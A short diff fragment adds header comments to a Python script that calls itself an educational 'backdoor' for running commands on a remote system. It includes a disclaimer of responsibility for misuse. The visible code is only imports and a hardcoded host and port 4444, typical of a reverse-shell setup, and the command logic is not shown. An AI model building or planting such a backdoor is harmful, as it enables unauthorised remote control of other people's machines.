@@ -1,5 +1,10 @@
+# This script was made purely for educational purposes.
+# I am not responsible for any misuse of this script.
+# This is a simple 'backdoor' script to demonstrate how a threat actor could use computer code to execute commands on a remote system.
+
 import socket
 import time
+
 host = '192.168.1.214'
 port = 4444
 
